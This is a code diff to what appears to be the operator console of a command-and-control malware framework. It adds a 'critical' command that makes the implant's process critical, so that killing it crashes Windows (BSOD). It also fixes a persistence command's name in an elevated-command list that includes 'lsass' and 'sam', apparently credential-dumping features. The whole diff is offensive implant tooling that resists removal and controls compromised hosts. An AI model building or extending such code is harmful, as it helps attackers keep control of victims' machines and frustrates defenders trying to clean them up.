@@ -114,6 +114,10 @@ agent_completer_windows = NestedCompleter.from_nested_dict({
     'assembly': None,
     'msgbox': None,
     'speak': None,
+    'critical': {
+        'true': None,
+        'false': None
+    },
     'sleep': None,
     'collect': None,
     'die': None,
@@ -144,7 +148,8 @@ agent_completer_linux = NestedCompleter.from_nested_dict({
 elevated_commands = [
     "lsass",
     "sam",
-    "persis-spe"
+    "persist-spe",
+    "critical"
 ]
 
 
@@ -239,6 +244,9 @@ def print_agent_help(os):
     msgbox <title> <text>                  ->  Pop a message box in a new thread
     speak <text>                           ->  Speak a string using the microphone
     
+    --== Misc stuff ==--
+    critical <true/false>                  -> Set process critical (BSOD on termination) (elevation required)
+
     --== Communication Stuff ==--
     sleep <sleep-time> <jitter-%>          ->  Change sleep time interval and jitter
     clear                                  ->  Clear pending commands
@@ -496,6 +504,13 @@ def agent_screen_windows(agent_id):
                 command_dict = {
                     "command_type": "speak",
                     "text": text
+                }
+            
+            elif re.fullmatch(r"\s*critical\s+(true|false)\s*", command):   
+                is_critical = shlex.split(re.sub(r"\s*critical\s+", "", command, 1))[0]
+                command_dict = {
+                    "command_type": "critical",
+                    "is_critical": is_critical,
                 }
 
             elif re.fullmatch(r"\s*sleep\s+\d+\s+\d+\s*", command):
